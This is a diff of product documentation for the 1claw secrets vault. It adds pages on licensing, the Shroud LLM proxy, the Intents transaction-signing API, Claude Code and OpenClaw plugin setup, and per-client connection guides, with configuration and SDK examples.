@@ -457,19 +457,78 @@ Humans need long-lived sessions or API keys for dashboards and automation; agent
 
 ---
 
+## Licensing
+
+---
+title: Licensing
+description: What parts of 1claw are open source (MIT) and what is proprietary.
+sidebar_position: 6
+---
+
+# Licensing
+
+1claw uses a split licensing model. Client-side packages are fully open source under the MIT license. Server-side infrastructure is proprietary and accessed via 1claw.xyz.
+
+## MIT (free to use commercially)
+
+| Package | npm | License |
+|---------|-----|---------|
+| `@1claw/sdk` | [npm](https://www.npmjs.com/package/@1claw/sdk) | MIT |
+| `@1claw/mcp` | [npm](https://www.npmjs.com/package/@1claw/mcp) | MIT |
+| `@1claw/cli` | [npm](https://www.npmjs.com/package/@1claw/cli) | MIT |
+| `@1claw/openapi-spec` | [npm](https://www.npmjs.com/package/@1claw/openapi-spec) | MIT |
+
+You can use, modify, and redistribute these packages in commercial projects without restriction. The full MIT license text is in each package's `LICENSE` file.
+
+## Proprietary (access via 1claw.xyz)
+
+| Component | Description |
+|-----------|-------------|
+| **Vault API** | HSM-backed secrets engine, policy engine, billing, auth |
+| **Dashboard** | Next.js web UI at 1claw.xyz |
+| **Shroud** | TEE LLM proxy running on GKE Confidential Nodes (AMD SEV-SNP) |
+| **Intents signing backend** | Transaction signing inside the TEE |
+
+These run as managed services. You interact with them through the MIT-licensed SDK, CLI, and MCP server.
+
+## Why this split?
+
+The packages you install and run locally should be MIT so you can vendor, fork, or extend them without legal friction. The infrastructure that holds your keys and runs inside hardware security modules is proprietary because it requires managed HSM/TEE infrastructure that can't be self-hosted trivially.
+
+## Self-hosting
+
+The Vault API source code is in the [1claw monorepo](https://github.com/1clawAI/1claw) under a proprietary license. If you need a self-hosted deployment (e.g., for air-gapped environments or regulatory requirements), contact [ops@1claw.xyz](mailto:ops@1claw.xyz) to discuss Enterprise licensing.
+
+
+---
+
 ## Parts of 1claw
 
 ---
 title: Parts of 1claw
-description: The API, Dashboard, MCP server, CLI, and SDK — what each is for and when to use it.
+description: Three products (Vault, Shroud, Intents) and the ways to use them — Dashboard, API, MCP, CLI, SDK.
 sidebar_position: 4
 ---
 
 # Parts of 1claw
 
-1claw is one product with several ways to use it. Pick the right one for your role and environment.
+1claw is built around **three products** and several **ways to use them**. Pick by product first, then by interface.
 
-## Vault API
+## Three products
+
+| Product | What it does |
+|--------|----------------|
+| **Vault** | Store and manage secrets. Human API, Agent API, and MCP give you just-in-time access. Dashboard, CLI, and SDK all talk to the same vault. |
+| **Shroud** | LLM proxy: your agent sends requests to Shroud instead of directly to OpenAI, Anthropic, Google (Gemini), etc. Shroud inspects, redacts secrets, and blocks prompt injection before forwarding. |
+| **Intents** | Let agents sign and broadcast blockchain transactions. The server signs in the HSM (or in Shroud’s TEE); the private key never leaves the vault. |
+
+Vault is the foundation: Shroud and Intents extend it (Shroud for LLM traffic, Intents for on-chain transactions). You can use Vault only, or add Shroud and/or Intents per agent.
+
+---
+
+## Ways to use 1claw
+
+### Vault API
 
 **What it is:** The REST API that everything else talks to. Base URL: `https://api.1claw.xyz`. Handles auth, vaults, secrets, policies, agents, sharing, billing, and audit.
 
@@ -479,19 +538,39 @@ sidebar_position: 4
 
 ---
 
-## Dashboard
+### Dashboard
 
-**What it is:** The web UI at [1claw.xyz](https://1claw.xyz). Sign in with email/password or Google, then manage vaults, secrets, agents, policies, sharing, audit log, API keys, billing, and team.
+**What it is:** The web UI at [1claw.xyz](https://1claw.xyz). Sign in with email/password or Google, then manage vaults, secrets, agents, policies, sharing, audit log, API keys, billing, and team. You can enable **Shroud** and **Intents** per agent and configure guardrails.
 
-**When to use it:** For day-to-day setup and management — creating vaults, storing secrets, registering agents, granting access, viewing audit logs, upgrading or managing billing. Most humans use the dashboard as the main way to interact with 1claw.
+**When to use it:** For day-to-day setup and management — creating vaults, storing secrets, registering agents, granting access, configuring Shroud/Intents, viewing audit logs, and billing.
 
 **You need:** An account (sign up at 1claw.xyz). Optional: MFA and API keys for extra security.
 
 ---
 
-## MCP Server
+### Shroud (LLM proxy)
 
-**What it is:** A [Model Context Protocol](https://modelcontextprotocol.io) server that exposes 1claw as tools (e.g. `list_secrets`, `get_secret`, `put_secret`, `create_vault`, `share_secret`, `simulate_transaction`, `submit_transaction`). AI assistants (Claude, Cursor, GPT, etc.) call these tools so they can use secrets at runtime without you pasting credentials.
+**What it is:** A proxy at [shroud.1claw.xyz](https://shroud.1claw.xyz). Your agent sends LLM requests to Shroud with `X-Shroud-Agent-Key` and `X-Shroud-Provider`; Shroud authenticates the agent, (optionally) pulls the provider API key from the vault, runs threat detection and secret redaction, then forwards to the upstream provider. Supports OpenAI, Anthropic, Google (Gemini), Mistral, Cohere, and OpenRouter.
+
+**When to use it:** When you want to prevent prompt injection, redact secrets from prompts, or centralize provider API keys in the vault. See [Shroud](/docs/guides/shroud).
+
+**You need:** An agent with Shroud enabled; provider API key in the vault or sent via `X-Shroud-Api-Key`.
+
+---
+
+### Intents API
+
+**What it is:** Endpoints for submitting and simulating transactions. The agent calls `POST /v1/agents/:id/transactions` with chain, recipient, value, and signing key path; the server signs and broadcasts. Optional: run in Shroud’s TEE for signing inside a confidential environment.
+
+**When to use it:** When your agent needs to send on-chain transactions (transfers, contract calls) without ever holding the private key. See [Intents API](/docs/guides/intents-api).
+
+**You need:** An agent with `intents_api_enabled: true`; a signing key stored in a vault path the agent can read; policies that allow the agent to use that path.
+
+---
+
+### MCP Server
+
+**What it is:** A [Model Context Protocol](https://modelcontextprotocol.io) server that exposes 1claw as tools (e.g. `list_secrets`, `get_secret`, `put_secret`, `create_vault`, `share_secret`, `simulate_transaction`, `submit_transaction`). AI assistants (Claude, Cursor, GPT, etc.) call these tools so they can use secrets and submit transactions at runtime.
 
 **When to use it:** When you want an AI agent to read or write secrets, create vaults, or sign transactions through 1claw. Configure your AI tool to use the 1claw MCP server (hosted at `mcp.1claw.xyz` or run locally). The agent uses its own API key; you control what it can do via policies.
 
@@ -499,7 +578,7 @@ sidebar_position: 4
 
 ---
 
-## CLI
+### CLI
 
 **What it is:** A command-line tool (`@1claw/cli`) for CI/CD, servers, and local scripts. Log in via browser (device flow) or with email/password, then run commands for vaults, secrets, agents, policies, and shares. Can inject secrets into env or run a command with secrets loaded.
 
@@ -509,7 +588,7 @@ sidebar_position: 4
 
 ---
 
-## SDK
+### SDK
 
 **What it is:** TypeScript/JavaScript client (`@1claw/sdk`) that wraps the REST API. Methods for auth, vaults, secrets, policies, agents, sharing, billing, audit, chains, and (for agents) transaction simulation and submission.
 
@@ -526,9 +605,11 @@ sidebar_position: 4
 | A human setting things up   | **Dashboard**              |
 | A human in a script/CI      | **CLI** or **SDK**         |
 | An AI agent (MCP client)    | **MCP Server** (hosted or local) |
+| An agent calling LLMs       | **Shroud** (optional) + Vault |
+| An agent signing txs        | **Intents API** + Vault   |
 | A custom app or backend     | **SDK** or **Vault API**   |
 
-All of them talk to the same Vault API and the same data. Create a vault in the dashboard, store a secret via the API or CLI, and an agent using MCP can read it — as long as you’ve granted that agent access with a policy.
+All of them talk to the same Vault API and the same data. Create a vault in the dashboard, store a secret via the API or CLI, and an agent using MCP can read it — as long as you’ve granted that agent access with a policy. Enable Shroud so the agent’s LLM traffic is inspected; enable Intents so the agent can submit transactions without ever seeing the key.
 
 For definitions of terms (vault, secret, policy, agent, etc.), see the [Glossary](/docs/reference/glossary). For common errors and fixes, see [Troubleshooting](/docs/guides/troubleshooting).
 
@@ -748,11 +829,8 @@ for (const agentName of agents) {
   });
 
   // Create a policy granting this agent access to its own vault
-  await client.access.grantAgent({
-    vault_id: vault.id,
-    secret_path_pattern: "**",
-    principal_id: agentIds[agentName],
-    permissions: ["read", "write"],
+  await client.access.grantAgent(vault.id, agentIds[agentName], ["read", "write"], {
+    secretPathPattern: "**",
   });
 }
 ```
@@ -1568,6 +1646,81 @@ For organizations with custom requirements, unlimited usage, dedicated support, 
 
 ---
 
+## Setup 1claw with Claude Code
+
+---
+title: Setup 1claw with Claude Code
+description: Connect Claude Code to your 1claw vault via MCP and optionally install the 1claw skill so Claude knows when and how to use it.
+sidebar_position: 6
+---
+
+# Setup 1claw with Claude Code
+
+[Claude Code](https://code.claude.com) can use 1claw in two ways:
+
+1. **MCP** — Connect to the 1claw MCP server so Claude has tools to list, get, put, and manage secrets. Same configuration as Cursor.
+2. **Skill (optional)** — Install the 1claw skill so Claude knows when to use 1claw, which tools to call, and best practices (just-in-time fetch, no echoing secrets). Uses the same [Agent Skills](https://agentskills.io/) format as OpenClaw.
+
+## 1. Connect via MCP
+
+Claude Code supports MCP. Use the same setup as **Cursor**:
+
+- **Hosted:** Add the MCP server with URL `https://mcp.1claw.xyz/mcp` and headers `Authorization: Bearer <jwt>` and `X-Vault-ID: <vault-uuid>`. Get the JWT from `POST /v1/auth/agent-token` with your agent ID and API key.
+- **Local (stdio):** Run the 1claw MCP server locally with env vars `ONECLAW_AGENT_ID`, `ONECLAW_AGENT_API_KEY`, `ONECLAW_VAULT_ID`.
+
+Configure MCP in Claude Code (e.g. via `claude mcp add` or your Claude Code settings). Exact UI may vary; follow [Anthropic’s MCP docs](https://docs.anthropic.com/en/docs/claude-code/mcp) for your version.
+
+**→ Full config examples:** [MCP Setup Guide](/docs/mcp/setup) — use the Cursor sections; they apply to Claude Code.
+
+## 2. Optional: Install the 1claw skill
+
+Skills in Claude Code are `SKILL.md` files in a skill directory. The 1claw skill teaches Claude when to use 1claw (e.g. “I need an API key”), which MCP tools to call, and security practices (don’t store or echo secret values).
+
+### Option A: Copy from the repo (personal, all projects)
+
+Clone or download the 1claw skill and put it in your personal skills folder so it’s available in every project:
+
+```bash
+mkdir -p ~/.claude/skills/1claw
+curl -sL https://raw.githubusercontent.com/1clawAI/1claw-skill/main/SKILL.md -o ~/.claude/skills/1claw/SKILL.md
+```
+
+(If you have the 1claw monorepo cloned with the `skill` submodule, you can copy `skill/SKILL.md` to `~/.claude/skills/1claw/SKILL.md` instead.)
+
+### Option B: Project-only skill
+
+For a single project, create a project-level skill:
+
+```bash
+mkdir -p .claude/skills/1claw
+curl -sL https://raw.githubusercontent.com/1clawAI/1claw-skill/main/SKILL.md -o .claude/skills/1claw/SKILL.md
+```
+
+Claude Code will discover the skill. You can invoke it with `/1claw` or let Claude load it when relevant (e.g. when you ask for a secret or API key).
+
+### Optional supporting files
+
+The full skill package in the [1claw-skill repo](https://github.com/1clawAI/1claw-skill) includes `EXAMPLES.md` and `CONFIG.md`. Clone the repo and copy all three files into `~/.claude/skills/1claw/` or `.claude/skills/1claw/` if you want Claude to use examples and config details.
+
+Reference these in your workflow if you want Claude to use examples and config details; the main instructions are in `SKILL.md`.
+
+## Summary
+
+| Step | Action |
+|------|--------|
+| MCP | Add 1claw MCP server (hosted or local) — see [MCP Setup](/docs/mcp/setup) (Cursor section). |
+| Skill | Copy `skill/SKILL.md` to `~/.claude/skills/1claw/SKILL.md` or `.claude/skills/1claw/SKILL.md`. |
+| Test | In Claude Code, ask e.g. “List the secrets in my 1claw vault” or use `/1claw`. |
+
+## See also
+
+- [MCP Setup](/docs/mcp/setup) — Claude Desktop, Cursor, and Claude Code MCP config.
+- [Using 1claw with OpenClaw](/docs/guides/openclaw) — Same skill, installed via ClawHub for OpenClaw.
+- [Skill source](https://github.com/1clawAI/1claw-skill) — SKILL.md, EXAMPLES.md, CONFIG.md.
+
+
+---
+
 ## 1Claw CLI
 
 ---
@@ -2201,11 +2354,8 @@ curl -s -X POST "https://api.1claw.xyz/v1/vaults/$VAULT_ID/policies" \
 <TabItem value="typescript" label="TypeScript">
 
 ```typescript
-await client.access.grantAgent({
-  vault_id: vault.id,
-  secret_path_pattern: "**",
-  principal_id: agentId,
-  permissions: ["read"],
+await client.access.grantAgent(vault.id, agentId, ["read"], {
+  secretPathPattern: "**",
 });
 ```
 
@@ -2308,6 +2458,18 @@ import TabItem from '@theme/TabItem';
 
 The Intents API lets an agent submit on-chain transactions — transfers, swaps, contract calls — while **never having access to the raw private key**. The server signs the transaction using keys stored in the vault and broadcasts it through a dedicated RPC for the target chain.
 
+## Quickstart: Your first transaction (~5 min)
+
+1. **Create an agent** with `intents_api_enabled: true` (Dashboard → Agents → Create, or API below). Note the agent ID and API key.
+2. **Store a signing key** in a vault the agent can read: put a secp256k1 private key at a path like `keys/ethereum-signer` or `wallets/hot-wallet` (see [Secrets](/docs/human-api/secrets/create)). Grant the agent read access to that path via a policy.
+3. **Get an agent JWT:** `POST /v1/auth/agent-token` with `agent_id` and `api_key`.
+4. **Submit a transaction:** `POST /v1/agents/:agent_id/transactions` with `chain`, `to`, `value`, and `signing_key_path`. Use testnets (e.g. `chain: "sepolia"`) first.
+5. **Optional:** Set `simulate_first: true` to run a Tenderly simulation before signing; if the simulation reverts, the API returns **422** and does not sign. See [Transaction simulation (Tenderly)](#simulation) and [Error codes](/docs/reference/error-codes#intents-api-errors).
+
+:::tip
+Default signing key path is `keys/{chain}-signer` (e.g. `keys/base-signer`). You can override with `signing_key_path` in the request. Allowed path prefixes: `keys/`, `wallets/`, `agents/{id}/keys/`.
+:::
+
 ## How it works
 
 ```
@@ -2366,6 +2528,25 @@ const { data } = await client.agents.create({
 ```
 
 </TabItem>
+<TabItem value="python" label="Python">
+
+```python
+import os
+import requests
+
+BASE = "https://api.1claw.xyz"
+headers = {"Authorization": f"Bearer {os.environ['ONECLAW_TOKEN']}"}
+r = requests.post(
+    f"{BASE}/v1/agents",
+    json={"name": "DeFi Bot", "intents_api_enabled": True},
+    headers=headers,
+)
+r.raise_for_status()
+agent = r.json()
+agent_id = agent["id"]
+```
+
+</TabItem>
 </Tabs>
 
 ### What changes when enabled
@@ -2408,6 +2589,26 @@ const { data: tx } = await client.agents.submitTransaction(agentId, {
   data: "0x",
   signing_key_path: "wallets/hot-wallet",
 });
+```
+
+</TabItem>
+<TabItem value="python" label="Python">
+
+```python
+r = requests.post(
+    f"{BASE}/v1/agents/{agent_id}/transactions",
+    json={
+        "chain": "ethereum",
+        "to": "0xRecipientAddress",
+        "value": "1.0",
+        "data": "0x",
+        "signing_key_path": "wallets/hot-wallet",
+    },
+    headers=headers,
+)
+r.raise_for_status()
+tx = r.json()
+print(tx["tx_hash"], tx["status"])
 ```
 
 </TabItem>
@@ -2954,19 +3155,247 @@ cd packages/mcp && pnpm install && pnpm run build
 
 ---
 
+## 1claw OpenClaw Plugin
+
+---
+title: 1claw OpenClaw Plugin
+description: Install and configure the official OpenClaw gateway plugin for native 1claw tools, secret redaction, Shroud routing, and slash commands.
+sidebar_position: 8
+---
+
+# 1claw OpenClaw Plugin
+
+The **@1claw/openclaw-plugin** is an official OpenClaw gateway plugin that adds native 1claw support inside your OpenClaw instance: agent tools, secret redaction, optional secret injection, Shroud TEE routing, key-rotation monitoring, and slash commands. It runs in-process with the gateway (no separate MCP process required for the tools it provides).
+
+**Repository:** [github.com/1clawAI/1claw-openclaw-plugin](https://github.com/1clawAI/1claw-openclaw-plugin)  
+**npm:** [@1claw/openclaw-plugin](https://www.npmjs.com/package/@1claw/openclaw-plugin)
+
+For a lighter setup that only teaches your agent how to use 1claw (e.g. via an external MCP server), see [Using 1claw with OpenClaw](/docs/guides/openclaw) (skill-only path).
+
+---
+
+## What the plugin provides
+
+| Feature | Default | Description |
+|--------|---------|-------------|
+| **Native agent tools** | On | 13 tools: secrets, vaults, policies, sharing, EVM simulate/submit. Prefix: `oneclaw_*`. |
+| **Secret redaction** | On | Scans outbound messages and redacts leaked secret values before they leave the gateway. |
+| **Secret injection** | Off | Replaces `{{1claw:path/to/secret}}` placeholders with real values at prompt time. |
+| **Shroud routing** | Off | When the agent has `shroud_enabled`, routes LLM traffic through [Shroud](https://shroud.1claw.xyz). |
+| **Key rotation monitor** | Off | Background service that warns when secrets expire within 7 days. |
+| **Slash commands** | On | `/oneclaw`, `/oneclaw-list`, `/oneclaw-rotate`. |
+| **Gateway RPC** | — | `1claw.status` for programmatic health/status. |
+| **Bundled skill** | — | 1claw skill (`skills/1claw/SKILL.md`) is auto-discovered by OpenClaw. |
+
+All of these are configurable via `plugins.entries.1claw.config.features`.
+
+---
+
+## Install
+
+From your OpenClaw environment:
+
+```bash
+openclaw plugins install @1claw/openclaw-plugin
+```
+
+Restart the OpenClaw Gateway after install. The plugin is enabled by default; configure it under `plugins.entries.1claw.config` (see [Config](#config) below).
+
+To install from a local path (e.g. the [1claw submodule](https://github.com/1clawAI/1claw) or a clone of the plugin repo):
+
+```bash
+openclaw plugins install -l ./path/to/1claw-openclaw-plugin
+```
+
+---
+
+## Config
+
+Minimal config: set the agent API key (from [enrollment](/docs/guides/agent-self-onboarding) or the [dashboard](https://1claw.xyz/agents)) in the plugin config or via environment variables.
+
+### Config file
+
+In your OpenClaw config (e.g. `config.json5` or the file your gateway loads):
+
+```json5
+{
+  plugins: {
+    entries: {
+      "1claw": {
+        enabled: true,
+        config: {
+          apiKey: "ocv_..."
+          // Optional: agentId, vaultId, baseUrl, shroudUrl
+          // Optional: features: { tools: true, secretRedaction: true, slashCommands: true, ... }
+          // Optional: securityMode: "block" | "surgical" | "log_only"
+        }
+      }
+    }
+  }
+}
+```
+
+### Environment variables
+
+You can rely on env vars instead of (or as fallback for) the config file:
+
+| Variable | Description |
+|----------|-------------|
+| `ONECLAW_AGENT_API_KEY` | Agent API key (`ocv_...`). Required. |
+| `ONECLAW_AGENT_ID` | Agent UUID. Optional; resolved from the key if omitted. |
+| `ONECLAW_VAULT_ID` | Default vault UUID. Optional; auto-discovered from the token response or first vault. |
+| `ONECLAW_BASE_URL` | 1claw API base URL. Default: `https://api.1claw.xyz`. |
+| `ONECLAW_SHROUD_URL` | Shroud proxy URL. Default: `https://shroud.1claw.xyz`. |
+| `ONECLAW_MCP_SANITIZATION_MODE` | Security mode for tool input inspection: `block`, `surgical`, or `log_only`. Default: `block`. |
+
+Config file values take precedence over env vars.
+
+---
+
+## Enabling tools for your agent
+
+When the plugin’s **tools** feature is on, it registers tools with an `oneclaw_` prefix (e.g. `oneclaw_list_secrets`, `oneclaw_get_secret`, `oneclaw_put_secret`). To allow your OpenClaw agent to call them, add the plugin or specific tool names to the agent’s tool allowlist in your config, for example:
+
+```json5
+agents: {
+  list: [{
+    id: "main",
+    tools: {
+      allow: ["1claw"]   // all 1claw plugin tools
+      // or list specific tools: ["oneclaw_list_secrets", "oneclaw_get_secret", ...]
+    }
+  }
+}
+```
+
+See [OpenClaw plugin docs](https://docs.openclaw.ai/tools/plugin) for the full tool-allowlist syntax.
+
+---
+
+## Slash commands
+
+When **slash commands** are enabled, the plugin registers:
+
+| Command | Description |
+|--------|-------------|
+| `/oneclaw` | Connection status, vault info, token TTL, and which features are on. |
+| `/oneclaw-list` | List secret paths in the vault (metadata only). Optional argument: path prefix. |
+| `/oneclaw-rotate <path> <new-value>` | Rotate a secret at `path` to a new value. |
+
+These run without invoking the AI agent. Require auth by default.
+
+---
+
+## Gateway RPC
+
+The plugin registers a single RPC method for programmatic checks:
+
+- **`1claw.status`** — Returns authentication state, agent ID, vault ID, token TTL, vault count, enabled features, and security mode. Useful for health checks or admin tooling.
+
+See [OpenClaw Gateway RPC](https://docs.openclaw.ai) for how to call it from your stack.
+
+---
+
+## Feature toggles
+
+To turn features on or off, set `plugins.entries.1claw.config.features`:
+
+```json5
+{
+  plugins: {
+    entries: {
+      "1claw": {
+        enabled: true,
+        config: {
+          apiKey: "ocv_...",
+          features: {
+            tools: true,
+            secretRedaction: true,
+            secretInjection: false,
+            shroudRouting: false,
+            keyRotationMonitor: false,
+            slashCommands: true
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+- **Secret injection** and **Shroud routing** modify prompt or provider behavior; they can also be restricted by the operator via `plugins.entries.1claw.hooks.allowPromptInjection: false` if needed.
+- **Key rotation monitor** runs a background job that lists secrets and logs warnings for any expiring within 7 days.
+
+---
+
+## Security and tool input inspection
+
+The plugin runs the same threat checks as the [1claw MCP server](/docs/mcp/security) on tool inputs (command injection, encoding obfuscation, social-engineering patterns, etc.). The mode is controlled by `plugins.entries.1claw.config.securityMode` or `ONECLAW_MCP_SANITIZATION_MODE`:
+
+- **`block`** (default) — Reject tool calls when high/critical threats are detected.
+- **`surgical`** — Normalize Unicode and confusables where possible; still block on critical.
+- **`log_only`** — Log threats but do not block.
+
+---
+
+## Plugin vs skill-only
+
+| | **Plugin** (@1claw/openclaw-plugin) | **Skill only** (e.g. clawhub install 1claw) |
+|---|--------------------------------------|---------------------------------------------|
+| **Install** | `openclaw plugins install @1claw/openclaw-plugin` | `clawhub install 1claw` (or add skill manually) |
+| **Tools** | Native gateway tools (`oneclaw_*`) in-process | Uses 1claw MCP server (stdio or hosted); agent calls MCP tools |
+| **Redaction / injection** | Built-in hooks | Not provided by the skill |
+| **Shroud routing** | Built-in when agent has `shroud_enabled` | Configure separately if needed |
+| **Slash commands** | `/oneclaw`, `/oneclaw-list`, `/oneclaw-rotate` | None |
+| **Best for** | Full 1claw integration inside OpenClaw | Simple “agent knows how to use 1claw” with minimal gateway changes |
+
+You can use the plugin and still point the agent at an external MCP server for other tools; the plugin simply adds native 1claw capabilities and optional safety (redaction, Shroud) inside the gateway.
+
+---
+
+## Next steps
+
+- [Using 1claw with OpenClaw](/docs/guides/openclaw) — Skill-only setup and credential configuration.
+- [OpenClaw Plugins](https://docs.openclaw.ai/tools/plugin) — Plugin system reference.
+- [MCP Server](/docs/mcp/overview) — 1claw MCP tools and when to use them alongside or instead of the plugin.
+- [Give an agent access](/docs/guides/give-agent-access) — Policies so the agent can access the right vault and paths.
+
+
+---
+
 ## Using 1claw with OpenClaw
 
 ---
 title: Using 1claw with OpenClaw
-description: Add the 1claw skill to your OpenClaw gateway so your AI agent can store and retrieve secrets from the vault.
+description: Add the 1claw skill or the full OpenClaw plugin so your AI agent can store and retrieve secrets from the vault.
 sidebar_position: 7
 ---
 
 # Using 1claw with OpenClaw
 
-[OpenClaw](https://docs.openclaw.ai) is a self-hosted gateway that connects chat apps (WhatsApp, Telegram, Discord, iMessage, and more) to AI coding agents. The **1claw skill** lets your OpenClaw agent use the 1Claw vault to store, retrieve, rotate, and share secrets — so the agent can use API keys and credentials at runtime without them ever living in chat or context.
+[OpenClaw](https://docs.openclaw.ai) is a self-hosted gateway that connects chat apps (WhatsApp, Telegram, Discord, iMessage, and more) to AI coding agents. You can connect 1claw in two ways:
 
-## What you get
+---
+
+## Option 1: 1claw OpenClaw plugin (recommended)
+
+The **@1claw/openclaw-plugin** runs inside your OpenClaw gateway and adds native 1claw support: agent tools (list/get/put secrets, vaults, sharing, EVM transactions), automatic secret redaction in messages, optional Shroud TEE routing, slash commands (`/oneclaw`, `/oneclaw-list`, `/oneclaw-rotate`), and a bundled skill. No separate MCP process is required for these tools.
+
+**Install:**
+
+```bash
+openclaw plugins install @1claw/openclaw-plugin
+```
+
+Then set your agent API key in the plugin config or via `ONECLAW_AGENT_API_KEY`, restart the gateway, and allow the tools for your agent (e.g. `tools.allow: ["1claw"]`). Full details: [1claw OpenClaw Plugin](/docs/guides/openclaw-plugin).
+
+---
+
+## Option 2: Skill only (this page)
+
+Add only the **1claw skill** so your agent knows how to use 1claw; the agent calls the 1claw MCP server (you run it or use the hosted one). No gateway plugin — lighter setup, but no built-in redaction, Shroud routing, or slash commands.
+
+## What you get (skill path)
 
 With the 1claw skill installed, your OpenClaw agent can:
 
@@ -3035,10 +3464,11 @@ The 1claw skill teaches your agent how to call 1Claw's MCP tools (e.g. `list_sec
 
 ## Next steps
 
+- [1claw OpenClaw Plugin](/docs/guides/openclaw-plugin) — Full gateway plugin (native tools, redaction, Shroud, slash commands).
 - [OpenClaw documentation](https://docs.openclaw.ai) — Gateway setup, channels, and configuration.
 - [MCP Server](/docs/mcp/overview) — 1Claw MCP tools and setup in detail.
 - [Give an agent access](/docs/guides/give-agent-access) — Create policies so your agent can access the right vault and paths.
-- [Skill repository](https://github.com/1clawAI/1claw/tree/main/skill) — Skill source (SKILL.md, EXAMPLES.md, CONFIG.md) and validation script.
+- [Plugin repository](https://github.com/1clawAI/1claw-openclaw-plugin) — Plugin source (includes bundled skill).
 
 
 ---
@@ -3315,6 +3745,77 @@ See [Intents API guide](/docs/guides/intents-api) for details.
 
 ---
 
+## Setup by client
+
+---
+title: Setup by client
+description: Connect 1claw to your preferred AI assistant or IDE — Claude Desktop, Cursor, Claude Code, OpenClaw, ChatGPT, or any MCP client.
+sidebar_position: 1
+---
+
+# Setup by client
+
+Use this page to jump to the right setup for your environment. Every path assumes you have a [1claw account](https://1claw.xyz), a vault, an **agent** (with API key), and a **policy** granting the agent access to the vault. See [Give an agent access](/docs/guides/give-agent-access) if you haven’t set that up yet.
+
+## Quick reference
+
+| Client | How to connect | Guide |
+|--------|----------------|-------|
+| **Claude Desktop** | MCP (hosted or local stdio) | [MCP Setup](/docs/mcp/setup) — Claude Desktop section |
+| **Cursor** | MCP (hosted or local stdio) | [MCP Setup](/docs/mcp/setup) — Cursor section |
+| **Claude Code** | MCP + optional 1claw skill | [Claude Code](/docs/guides/claude-code) |
+| **OpenClaw** | 1claw skill via ClawHub | [Using 1claw with OpenClaw](/docs/guides/openclaw) |
+| **ChatGPT / Custom GPTs** | REST API or Custom GPT Action | [ChatGPT & other API clients](/docs/guides/setup-by-client#chatgpt-and-other-api-clients) below |
+| **Any MCP client** | Hosted URL or stdio | [MCP Setup](/docs/mcp/setup) — Option 1 or 2 |
+
+## Claude Desktop
+
+Configure the 1claw MCP server in Claude Desktop so the assistant can list and fetch secrets from your vault. Use either the **hosted** server (no local install) or a **local** stdio process.
+
+**→ [MCP Setup Guide](/docs/mcp/setup)** — see the “Claude Desktop” sections for both options.
+
+## Cursor
+
+Add the 1claw MCP server to your project (e.g. `.cursor/mcp.json`) so Cursor’s AI can use vault secrets via MCP tools. Hosted or local stdio.
+
+**→ [MCP Setup Guide](/docs/mcp/setup)** — see the “Cursor” sections.
+
+## Claude Code
+
+[Claude Code](https://code.claude.com) supports MCP and the same [Agent Skills](https://agentskills.io/) style skills as OpenClaw. To use 1claw from Claude Code:
+
+1. **Connect via MCP** — Same configuration as Cursor (hosted or local). See [MCP Setup](/docs/mcp/setup).
+2. **Optional: install the 1claw skill** — So Claude knows when and how to use 1claw (tools, auth, best practices). The same `SKILL.md` we use for OpenClaw works in Claude Code.
+
+**→ [Setup 1claw with Claude Code](/docs/guides/claude-code)** for step-by-step MCP config and skill install.
+
+## OpenClaw
+
+If you run an [OpenClaw](https://docs.openclaw.ai) gateway (WhatsApp, Telegram, Discord, etc.), install the **1claw skill** via ClawHub. The skill teaches your OpenClaw agent to use the 1Claw vault (list, get, put, share secrets) via the 1Claw MCP server.
+
+**→ [Using 1claw with OpenClaw](/docs/guides/openclaw)** — enrollment, `clawhub install 1claw`, and credentials.
+
+## ChatGPT and other API clients
+
+ChatGPT does not support MCP. To use 1claw from ChatGPT or similar tools you can:
+
+- **REST API** — Use the [Agent API](/docs/agent-api/overview): get a JWT via `POST /v1/auth/agent-token` with your agent ID and API key, then call the vault endpoints (e.g. list secrets, get secret by path). Use from a Custom GPT **Action** (OpenAPI schema pointing at `https://api.1claw.xyz`) or from your own backend that proxies requests.
+- **SDK** — Use [@1claw/sdk](https://www.npmjs.com/package/@1claw/sdk) in a small Node/TS service that your GPT or app calls.
+
+We don’t yet have a dedicated “ChatGPT Custom GPT” step-by-step. If you build one, the same [agent quickstart](/docs/quickstart/agents) and [Agent API](/docs/agent-api/overview) apply.
+
+## Any other MCP client
+
+Any client that supports MCP over HTTP or stdio can connect:
+
+- **Hosted:** `https://mcp.1claw.xyz/mcp` with headers `Authorization: Bearer <jwt>` and `X-Vault-ID: <vault-uuid>`. Get the JWT from `POST /v1/auth/agent-token`.
+- **Local:** Run the [1claw MCP server](https://www.npmjs.com/package/@1claw/mcp) with env vars `ONECLAW_AGENT_ID`, `ONECLAW_AGENT_API_KEY`, `ONECLAW_VAULT_ID`.
+
+**→ [MCP Setup](/docs/mcp/setup)** and [MCP integration](/docs/guides/mcp-integration) for details.
+
+
+---
+
 ## Sharing Secrets
 
 ---
@@ -3523,18 +4024,155 @@ For bulk operations across many agents, see [Managing Agent Fleets](/docs/guides
 
 ---
 
-## Shroud Security Features
+## Shroud
 
 ---
-title: Shroud Security Features
-sidebar_label: Security Features
-sidebar_position: 3
+title: Shroud
+description: LLM proxy that inspects and redacts before forwarding to OpenAI, Anthropic, Google (Gemini), and others. Blocks prompt injection and hides secrets.
+sidebar_label: Overview
+sidebar_position: 0
 tags: [shroud, security, threat-detection]
 ---
 
-# Shroud Security Features
+# Shroud
+
+Shroud is 1claw’s **LLM proxy**: your agent sends requests to Shroud instead of directly to the provider. Shroud authenticates the agent, (optionally) resolves the provider API key from the vault, runs threat detection and secret redaction, then forwards the request to the upstream LLM. Use it to block prompt injection, redact secrets from prompts, and centralize provider keys.
+
+---
+
+## Security Features
 
 Shroud includes comprehensive threat detection and input sanitization to protect AI agents from various attack vectors. All features are configurable on a per-agent basis via the Dashboard, SDK, or API.
+
+## Using the LLM Proxy
+
+Shroud exposes an LLM proxy so your agent sends requests to Shroud instead of directly to the provider. Shroud authenticates the agent, (optionally) resolves the provider API key from the vault, runs threat detection, then forwards the request to the upstream LLM. The proxy uses **OpenAI-compatible** paths where applicable; some providers (e.g. Google) use their native path internally.
+
+### Endpoint
+
+| Method | Path | Notes |
+|--------|------|--------|
+| POST   | `https://shroud.1claw.xyz/v1/chat/completions` | OpenAI-style; Shroud maps to provider-specific paths (e.g. Google uses `generateContent`) |
+
+Other paths (e.g. `/v1/messages` for Anthropic) are supported; the proxy routes by provider.
+
+### Required headers
+
+| Header | Description |
+|--------|-------------|
